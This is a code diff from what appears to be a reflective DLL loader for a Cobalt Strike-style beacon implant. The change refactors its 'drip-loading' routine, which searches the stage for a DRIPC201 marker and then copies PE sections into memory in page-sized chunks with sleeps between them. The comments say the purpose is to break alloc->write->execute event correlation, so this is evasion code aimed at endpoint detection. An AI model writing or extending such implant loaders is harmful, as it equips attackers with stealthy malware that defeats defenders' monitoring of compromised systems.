@@ -494,57 +494,42 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
 
     bw_zero(sc_base, size_of_image);
     /* C-56 stage drip-loading (4.12 rdll_use_driploading): the TS patches
-     * enable+delay into the DRIPC201 marker (src/stage_drip.c) in the stage
-     * bytes; honor it here by writing the image in page-sized drizzles with
-     * delay-ms sleeps - breaking the alloc->write->execute event
-     * correlation (technique: xuanxuan0/DripLoader, cited by the official
-     * 4.12 blog). Zeroed marker (or pre-C-56 beacon build) = plain copy. */
+     * enable+delay into the DRIPC201 marker (beacon .data, see
+     * datastore.cpp g_stage_drip); honor it by writing section data in
+     * 0x1000-byte drizzles with delay-ms sleeps (xuanxuan0/DripLoader).
+     * Zeroed marker / pre-C-56 stage = plain whole-section copies. */
     {
-        DWORD file_len = 0;
-        DWORD drip_on = 0, drip_ms = 0;
+        DWORD file_len = 0, drip_ms = 0;
         for (i = 0; i < nsec; i++) {
-            DWORD end = sec[i].PointerToRawData + sec[i].SizeOfRawData;
-            if (end > file_len)
-                file_len = end;
+            DWORD endr = sec[i].PointerToRawData + sec[i].SizeOfRawData;
+            if (endr > file_len) file_len = endr;
         }
         for (i = 0; i + 16 <= file_len; i += 4) {
-            if (flat[i] == 'D' && flat[i+1] == 'R' && flat[i+2] == 'I' && flat[i+3] == 'P'
-                && flat[i+4] == 'C' && flat[i+5] == '2' && flat[i+6] == '0' && flat[i+7] == '1') {
-                drip_on = *(DWORD *)(flat + i + 8);
+            if (*(DWORD *)(flat + i) == 0x50495244UL /* "DRIP" */
+                && *(DWORD *)(flat + i + 4) == 0x31303243UL /* "C201" */
+                && *(DWORD *)(flat + i + 8) != 0) {
                 drip_ms = *(DWORD *)(flat + i + 12);
                 break;
             }
         }
-        if (drip_on && pSleep != NULL) {
-            DWORD left, n;
-            bw_copy(sc_base, flat, opt->SizeOfHeaders);
-            for (i = 0; i < nsec; i++) {
-                if (sec[i].SizeOfRawData == 0)
-                    continue;
-                left = sec[i].SizeOfRawData;
-                j = 0;
-                while (left > 0) {
-                    n = left > 0x1000 ? 0x1000 : left;
-                    bw_copy(sc_base + sec[i].VirtualAddress + j,
-                            flat + sec[i].PointerToRawData + j, n);
-                    j += n;
-                    left -= n;
-                    if (left > 0 && drip_ms > 0)
-                        pSleep(drip_ms);
-                }
-            }
-        } else {
-            bw_copy(sc_base, flat, opt->SizeOfHeaders);
-            for (i = 0; i < nsec; i++) {
-                if (sec[i].SizeOfRawData == 0)
-                    continue;
-                bw_copy(sc_base + sec[i].VirtualAddress,
-                        flat + sec[i].PointerToRawData,
-                        sec[i].SizeOfRawData);
+        bw_copy(sc_base, flat, opt->SizeOfHeaders);
+        for (i = 0; i < nsec; i++) {
+            DWORD left, j, n;
+            if (sec[i].SizeOfRawData == 0)
+                continue;
+            left = sec[i].SizeOfRawData;
+            j = 0;
+            while (left > 0) {
+                n = (drip_ms && left > 0x1000) ? 0x1000 : left;
+                bw_copy(sc_base + sec[i].VirtualAddress + j,
+                        flat + sec[i].PointerToRawData + j, n);
+                j += n;
+                left -= n;
+                if (drip_ms && left > 0 && pSleep != NULL)
+                    pSleep(drip_ms);
             }
         }
     }
-
     if (!bw_process_reloc(sc_base, size_of_image))
         return 0;
     if (!bw_fill_iat(sc_base, pLoadLibraryA, pGetProcAddress))
